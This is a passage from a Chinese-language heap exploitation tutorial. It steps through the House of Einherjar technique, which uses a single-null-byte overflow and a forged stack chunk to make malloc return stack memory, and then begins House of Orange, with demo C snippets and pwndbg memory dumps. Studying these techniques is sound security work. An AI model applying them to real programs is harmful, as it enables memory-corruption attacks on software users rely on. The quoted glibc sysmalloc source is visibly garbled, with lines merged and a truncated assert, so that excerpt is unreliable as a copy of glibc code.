      fd_nextsize = 0x0,
      bk_nextsize = 0x0
    }
然后我们 malloc 一块新 chunk，这个时候，系统为循着 bk去 malloc一块新chunk
    PwnLife> x/20gx &stack_var-2
    0x7fffffffe3c8: 0x000000000040081a  0x0000000000400880            p fake_chunk
    $1 = {256, 256, 140737488348080, 140737488348080, 140737488348080, 140737488348080}
    pwndbg> x/20gx &fake_chunk
    0x7fffffffe3b0: 0x0000000000000100  0x0000000000000100
    0x7fffffffe3c0: 0x00007fffffffe3b0  0x00007fffffffe3b0
    0x7fffffffe3d0: 0x00007fffffffe3b0  0x00007fffffffe3b0
    0x7fffffffe3e0: 0x00007fffffffe4d0  0x3c402f70cff21400
    0x7fffffffe3f0: 0x0000000000400bf0  0x00007ffff7a303f1
    0x7fffffffe400: 0x0000000000040000  0x00007fffffffe4d8
    0x7fffffffe410: 0x00000001f7b9a488  0x00000000004006d6
    0x7fffffffe420: 0x0000000000000000  0x86f4a78e4a5b6ea9
    0x7fffffffe430: 0x00000000004005e0  0x00007fffffffe4d0
    0x7fffffffe440: 0x0000000000000000  0x0000000000000000
然后，在 malloc 一个 chunk
    b = (uint8_t*) malloc(0xf8);
紧接着，我们假设有个 堆溢出漏洞。
    66   fprintf(stderr, "\nb.size: %#lx\n", *b_size_ptr);
       67   fprintf(stderr, "b.size is: (0x100) | prev_inuse = 0x101\n");
       68   fprintf(stderr, "We overflow 'a' with a single null byte into the metadata of 'b'\n");
       69   a[real_a_size] = 0;
修改掉 chunk b 的size
    0x603040 PREV_INUSE {
      prev_size = 0,
      size = 256,  // 257 --> 256
      fd = 0x0,
      bk = 0x0,
      fd_nextsize = 0x0,
      bk_nextsize = 0x0
    }
然后还得让 prev_size 字段为 fake chunk 的大小
    pwndbg> p fake_chunk
    $8 = {256, 18446603336227507344, 140737488348080, 140737488348080, 140737488348080, 140737488348080}
chunk b的 prev_size 字段，用 chunk b 的起始地址减去 fake chunk 的起始地址，同时为了绕过检查，还需要将 fake
chunk 的 size 字段与 chunk b 的 prev_size 字段相匹配：
    size_t fake_size = (size_t)((b-sizeof(size_t)*2) - (uint8_t*)fake_chunk);
chunk b
    0x603040 {
      prev_size = 18446603336227507344,  // 0 -> 18446603336227507344
      size = 256,
      fd = 0x0,
      bk = 0x0,
      fd_nextsize = 0x0,
      bk_nextsize = 0x0
    }
然后我们 free 掉 chunk b
    88     fprintf(stderr, "Now we free b and this will consolidate with our fake chunk since b prev_inuse is not set\n");
       89     free(b);
       90     fprintf(stderr, "Our fake chunk size is now %#lx (b.size + fake_prev_size)\n", fake_chunk[1]);
然后，我们会发现 top chunk 变了,top chunk -> fake_chunk
    pwndbg> p main_arena
    $9 = {
      mutex = 0,
      flags = 1,
      fastbinsY = {0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0, 0x0},
      top = 0x7fffffffe3b0,
      last_remainder = 0x0,
      bins = {0x7ffff7dd1b58 , 0x7ffff7dd1b58 , 0x7ffff7dd1b68 , 0x7ffff7dd1b68 , 0x7ffff7dd1b78 , 0x7ffff7dd1b78 , 0x7ffff7dd1b88 , 0x7ffff7dd1b88 , 0x7ffff7dd1b98 , 0x7ffff7dd1b98 , 0x7ffff7dd1ba8 , 0x7ffff7dd1ba8 , 0x7ffff7dd1bb8 , 0x7ffff7dd1bb8 , 0x7ffff7dd1bc8 ...},
      binmap = {0, 0, 0, 0},
      next = 0x7ffff7dd1b00 ,
      next_free = 0x0,
      attached_threads = 1,
      system_mem = 135168,
      max_system_mem = 135168
    }
    pwndbg> p &fake_chunk
    $10 = (size_t (*)[6]) 0x7fffffffe3b0
由于，我们释放 chunk b，这时因为 PREV_INUSE 为零，unlink 会根据 prev_size 去寻找上一个 free
chunk，并将它和当前 chunk 合并。
这意味着，当我们 再去 malloc 一块 新chunk的时候，将会是 fake chunk 的位置。
    103     fprintf(stderr, "\nNow we can call malloc() and it will begin in our fake chunk\n");
       104     d = malloc(0x200);
如下：
    pwndbg> x/20gx fake_chunk
    0x7fffffffe3b0: 0x0000000000000100  0x0000000000000211
    0x7fffffffe3c0: 0x00007fffffffe3b0  0x00007fffffffe3b0
    0x7fffffffe3d0: 0x00007fffffffe3b0  0x00007fffffffe3b0
    0x7fffffffe3e0: 0x00007fffffffe4d0  0xc6f3cea232483100
    0x7fffffffe3f0: 0x0000000000400bf0  0x00007ffff7a303f1
    0x7fffffffe400: 0x0000000000040000  0x00007fffffffe4d8
    0x7fffffffe410: 0x00000001f7b9a488  0x00000000004006d6
    0x7fffffffe420: 0x0000000000000000  0x0575c70b1ba71a36
    0x7fffffffe430: 0x00000000004005e0  0x00007fffffffe4d0
    0x7fffffffe440: 0x0000000000000000  0x0000000000000000
    pwndbg> p d
    $14 = (uint8_t *) 0x7fffffffe3c0 "\260\343\377\377\377\177"
值得一提的是，这里绕过 unlink 检查的时候，直接：
    p->fd = p
    p->bk = p
### 0x15 house of orange
House of Orange的核心在于在没有free函数的情况下得到一个释放的堆块(unsorted bin)。 这种操作的原理简单来说是当前堆的top
chunk尺寸不足以满足申请分配的大小的时候，原来的top chunk会被释放并被置入unsorted
bin中，通过这一点可以在没有free函数情况下获取到unsorted bins。
我们知道一开始的时候，整个堆都属于 top chunk，每次申请内存时，就从 top chunk 中划出请求大小的堆块返回给用户，于是 top chunk
就越来越小。当某一次 top chunk 的剩余大小已经不能够满足请求时，就会调用函数 sysmalloc()
分配新内存，这时可能会发生两种情况，一种是直接扩充 top chunk，另一种是调用 mmap 分配一块新的 top
chunk。具体调用哪一种方法是由申请大小决定的，为了能够使用前一种扩展 top chunk，需要请求小于阀值 mp_.mmap_threshold：
    if ((unsigned long)(nb) >= (unsigned long)(mp_.mmap_threshold) && (mp_.n_mmaps = MINSIZE &&
               prev_inuse (old_top) &&
               ((unsigned long) old_end & (pagesize - 1)) == 0));
      /* Precondition: not enough current space to satisfy nb request */
      assert ((unsigned long) (old_size)  heap
    0x602000 PREV_INUSE {
      prev_size = 0,
      size = 1025,  // hex(1025) == 0x401
      fd = 0x0,
      bk = 0x0,
      fd_nextsize = 0x0,
      bk_nextsize = 0x0
    }
通常情况下 ，top chunk 大小为 0x21000，减去 0x400，所以此时的大小为 0x20c00，另外 PREV_INUSE 被设置。
    PwnLife> top_chunk
    0x602400 PREV_INUSE {
      prev_size = 0,
      size = 134145,
      fd = 0x0,
      bk = 0x0,
      fd_nextsize = 0x0,
      bk_nextsize = 0x0
    }
    PwnLife> x/20gx 0x602400
    0x602400:   0x0000000000000000  0x0000000000020c01  